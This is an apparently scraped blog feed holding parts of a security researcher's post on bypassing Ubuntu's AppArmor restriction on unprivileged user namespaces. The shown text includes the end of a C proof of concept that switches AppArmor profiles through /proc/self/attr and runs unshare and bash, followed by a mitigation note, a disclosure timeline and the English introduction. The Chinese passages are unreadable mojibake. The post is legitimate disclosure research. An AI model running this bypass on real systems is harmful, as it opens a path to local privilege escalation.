    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/uid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_WRONLY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/gid_map&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0 %d 1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile opam&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/unshare&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;open /proc/self/attr/current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;unshare_setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-mitigation&quot;&gt;6. Mitigation&lt;/h2&gt;

&lt;p&gt;é€™å€‹ç¹éæ–¹æ³•åƒ…åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; è¢«é—œé–‰ï¼ˆè¨­ç‚º 0ï¼‰æ™‚æ‰æœƒç”Ÿæ•ˆã€‚è€Œå¾ Ubuntu 25.04 é–‹å§‹ï¼Œé€™å€‹åƒæ•¸é è¨­ç‚ºå•Ÿç”¨ç‹€æ…‹ï¼Œå› æ­¤ä¸å—å½±éŸ¿ã€‚&lt;/p&gt;

&lt;p&gt;é‡å° Ubuntu 24.10 åŠæ›´æ—©ç‰ˆæœ¬çš„ä½¿ç”¨è€…ï¼Œå¯ä»¥åƒè€ƒ&lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;å®˜æ–¹èªªæ˜æ–‡ç« &lt;/a&gt;ï¼Œç­è§£å¦‚ä½•é˜²æ­¢ä»»ä½•éç‰¹æ¬Šä¸”è™•æ–¼ unconfined ç‹€æ…‹çš„ç¨‹å¼åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-exec&lt;/code&gt; ä¾†åˆ‡æ› AppArmor è¨­å®šæª”ï¼Œä»¥é¿å…ä¿è­·æ©Ÿåˆ¶é­åˆ°ç¹éã€‚&lt;/p&gt;

&lt;h2 id=&quot;7-disclosure-timeline&quot;&gt;7. Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2025-02-16ï¼šç ”ç©¶å“¡ @roddux æåˆ° AppArmor çš„å‘½åç©ºé–“é™åˆ¶æ©Ÿåˆ¶å¾ˆå®¹æ˜“è¢«ç¹éã€‚&lt;/li&gt;
  &lt;li&gt;2025-02-17ï¼šæˆ‘ç™¼ç¾ä¸€å€‹ç¹éæ–¹å¼ã€‚&lt;/li&gt;
  &lt;li&gt;2025-02-24ï¼šæˆ‘å°‡æ­¤å•é¡Œå›å ±çµ¦ ZDI åœ˜éšŠã€‚&lt;/li&gt;
  &lt;li&gt;2025-03-21ï¼šç ”ç©¶å“¡ @roddux å…¬é–‹äº†ä»–çš„ç¹éæ–¹æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;2025-03-27ï¼šQualys åœ˜éšŠåœ¨çœ‹åˆ° @roddux çš„å…¬é–‹è²¼æ–‡å¾Œï¼Œä¹Ÿç™¼å¸ƒäº†ä»–å€‘çš„æ¼æ´é€šå ±ã€‚&lt;/li&gt;
  &lt;li&gt;2025-04-27ï¼šZDI å›è¦†è¡¨ç¤ºå°æ­¤é¡å‹çš„æ¼æ´ä¸æ„Ÿèˆˆè¶£ï¼Œä¸¦æ‹’çµ•å¾ŒçºŒè™•ç†ã€‚&lt;/li&gt;
  &lt;li&gt;2025-04-30ï¼šæˆ‘æ”¹ç‚ºå°‡æ­¤å•é¡Œå›å ±çµ¦ Ubuntu å®‰å…¨åœ˜éšŠã€‚&lt;/li&gt;
  &lt;li&gt;2025-05-01ï¼šç¶­è­·è€… John é€šçŸ¥æˆ‘æ­¤å•é¡Œå·²é€²å…¥åˆæ­¥å¯©æŸ¥éšæ®µã€‚&lt;/li&gt;
  &lt;li&gt;2025-05-30ï¼šJohn å›è¦†å®Œæ•´çš„å•é¡Œåˆ†æèˆ‡èªªæ˜ã€‚&lt;/li&gt;
  &lt;li&gt;2025-06-26ï¼šå”ä½œç™¼å¸ƒæ–‡ç« ã€‚&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/</link>
                <guid>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction</guid>
                <pubDate>Thu, 26 Jun 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>The Journey of Bypassing Ubuntuâ€™s Unprivileged Namespace Restriction</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Recently, Ubuntu introduced sandbox mechanisms to reduce the attack surface, and they seemed unbreakable. However, after carrying out in-depth research, we found that the implementation contained some issues, and bypassing it was not as difficult as expected. This post will explain how we began our research at the kernel level and discovered a bypass method. We will also share some interesting stories from the process.&lt;/p&gt;

&lt;h2 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h2&gt;

&lt;h3 id=&quot;11-ubuntus-new-sandbox-model&quot;&gt;1.1. Ubuntuâ€™s New Sandbox Model&lt;/h3&gt;

&lt;p&gt;After years of serving as a rich attack surface for privilege escalation, unprivileged user namespaces finally started receiving serious attention. In April 2024, shortly after that yearâ€™s Pwn2Own, Ubuntu published a &lt;a href=&quot;https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts&quot;&gt;security-focused blog post&lt;/a&gt; announcing new mitigations designed to lock down unprivileged namespaces and io_uring. The goal was clear: to ensure that untrusted applications run within a tighter, more controlled sandbox. These restrictions were largely implemented through AppArmor.&lt;/p&gt;

&lt;p&gt;Fast forward to September 2024, Ubuntu followed up with a &lt;a href=&quot;https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf&quot;&gt;presentation&lt;/a&gt; introducing their sandbox architecture in more depth. The slides outlined not only the motivation behind the design but also provided a breakdown of how the sandbox operates under the hood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From these updates, it became evident that Ubuntuâ€™s new model only allows specific applications to create unprivileged namespaces. All other, untrusted processes are blocked. Without access to unprivileged namespaces, attackers lose their entry point to subsystems like netfilter and net/sched â€” historically fertile ground for discovering vulnerabilities. At first, this seemed like a bulletproof defense. Some researchers even speculated that Ubuntu, formerly the only Linux LPE target at Pwn2Own, might now be effectively unbreakable.&lt;/p&gt;

&lt;h3 id=&quot;12-emergence-of-the-bypass-method&quot;&gt;1.2. Emergence of the Bypass Method&lt;/h3&gt;

&lt;p&gt;But then, on February 16, something unexpected happened. I stumbled across a Twitter thread where someone claimed that the new AppArmor-based protections could be bypassed. Seriously? That got my attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Coincidentally, Pwn2Own 2025 was just around the corner. It felt like the perfect time to start digging. I decided to analyze how Ubuntu enforces these restrictions via AppArmor â€” and more importantly, whether there were any cracks in the armor.&lt;/p&gt;

&lt;p&gt;To my surprise, it didnâ€™t take long. Within a few hours of reviewing the code, I found a way to bypass them! It wasnâ€™t even particularly difficult to find it, as long as the investigation was conducted in the right direction. With unprivileged namespaces now back on the table, the next step in my plan was straightforward: find a vulnerability in a module of the network subsystem that Ubuntu enables by default but kernelCTF does not. Couldnâ€™t be better!&lt;/p&gt;

&lt;p&gt;Unfortunately, things didnâ€™t go so well. Just a week later, on February 24, the official rules for Pwn2Own Berlin were announced, and Ubuntu was off the table because the Linux LPE target was changed to Red Hat Enterprise Linux. To make things worse (for the bypass, at least), RHEL doesnâ€™t restrict unprivileged namespaces at all. Which meantâ€¦ my bypass was now irrelevant to the competition.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;13-vendor-response&quot;&gt;1.3. Vendor Response&lt;/h3&gt;

&lt;p&gt;Upon learning that Ubuntu was no longer a Pwn2Own target, I promptly submitted the issue through the ZDI portal, the platform I usually use for vulnerability reporting. But while I waited for a response, the &lt;a href=&quot;https://x.com/roddux/status/1903028631514837107&quot;&gt;researcher (@roddux)&lt;/a&gt; posted a bypass method on Twitter on March 21. Later, on March 27, the Qualys Team released a &lt;a href=&quot;https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt&quot;&gt;disclosure&lt;/a&gt; that included more detailed technical explanations. All of these methods are based on a similar root cause as the one I identified.&lt;/p&gt;

&lt;p&gt;As a researcher, it was frustrating to see various bypass methods being publicly disclosed while I couldnâ€™t share my own work because I had already reported it to ZDI. After a few days with no updates, I even emailed ZDI to ask if I could withdraw my submission. Thankfully, my boss, Orange Tsai, stepped in just in time and patiently walked me through the pros and cons of doing so. That helped me regain my composure, and I ended up sending another email to retract my withdrawal request.&lt;/p&gt;

&lt;p&gt;On April 27, the ZDI team finally reviewed my report, but they said they were not interested in the issue. So, I decided to report it directly to the Ubuntu Security Team. Within a day, I received a quick response from John, one of the maintainers of the namespace restriction mechanism. He said they were verifying the issue and would notify me of any updates. By the way, this was my first time reporting an issue to the Ubuntu Security Team, and their responsiveness and friendliness made it a great experience to collaborate with them.&lt;/p&gt;

&lt;p&gt;After about a month of discussion, they finally determined that the issue I reported was a variant of the bypass methods previously disclosed by the Qualys Team. It only works when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; is disabled, which has been enabled by default since Ubuntu 25.04. They had also recommended that users disable it in earlier versions through their &lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;official post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This post documents my bypass technique and the full disclosure timeline. While the core idea aligns with previously published methods, I believe it is still worth publishing because the method was discovered from a kernel side rather than from userspace. I hope every reader enjoys it!&lt;/p&gt;

&lt;h2 id=&quot;2-apparmor-101&quot;&gt;2. AppArmor 101&lt;/h2&gt;

&lt;h3 id=&quot;21-overview&quot;&gt;2.1. Overview&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;AppArmor (Application Armor)&lt;/strong&gt; is an implementation of a Linux Security Module (LSM) that provides Mandatory Access Control (MAC), restricting processesâ€™ access to system resources. Administrators can define an AppArmor profile for a program to limit its capabilities. If a process does not have an AppArmor profile, it runs in &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile&lt;/strong&gt;, meaning AppArmor does not impose any restrictions on it.&lt;/p&gt;

&lt;p&gt;Each profile defines access control for an individual program, specifying which files, capabilities, and network permissions it can access. Enabled profiles can operate in two modes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Enforced mode&lt;/strong&gt;: Violating behavior is blocked and logged.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Complain mode&lt;/strong&gt;: Violating behavior is only logged but not blocked.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example profile:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile ipa_verify /usr/bin/ipa_verify flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/ipa_verify&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile ipa_verify&lt;/code&gt;: Defines a profile named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipa_verify&lt;/code&gt;.&lt;/li&gt;
